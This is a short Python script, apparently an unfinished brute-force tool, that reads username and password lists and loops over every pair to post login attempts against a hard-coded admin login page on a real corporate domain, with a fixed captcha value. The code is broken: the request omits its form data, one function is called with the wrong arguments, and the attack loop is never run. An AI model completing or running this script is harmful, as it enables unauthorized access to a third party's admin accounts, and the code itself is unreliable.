import optparse
import requests


def init_opt():
    parse = optparse.OptionParser()
    parse.add_option("-u", action="store", dest="username", help="username")
    parse.add_option("-U", action="store", dest="username_file", help="file of usernames")
    parse.add_option("-P", action="store", dest="password_file", help="file of passwords")
    (options, args) = parse.parse_args()
    return options

def login(username, password, url):
    url = "http://air.pingan.com/admin/login/login"
    data = {
        "LoginForm[username]": username,
        "LoginForm[password]": password,
        "LoginForm[code]": "134234"
    }
    r = requests.post(url, )

def read_file(filename):
    with open(filename, 'r', encoding='utf8') as f:
        result = f.read().splitlines()
    return result


def build_users_and_pass(opt):
    usernames = []
    passwords = []
    username = opt.username
    if username is not None:
        usernames.append(username)
    elif opt.username_file:
        usernames = read_file(opt.username_file)
    if opt.password_file:
        password_file = opt.password_file
        passwords = read_file(password_file)
    return usernames, passwords

def batch_login(usernames, passwords):
    for username in usernames:
        for password in passwords:
            login(username, password)


if __name__ == '__main__':
    options = init_opt()
    print(type(options))
    usernames, passwords = build_users_and_pass(options)
    print(usernames)

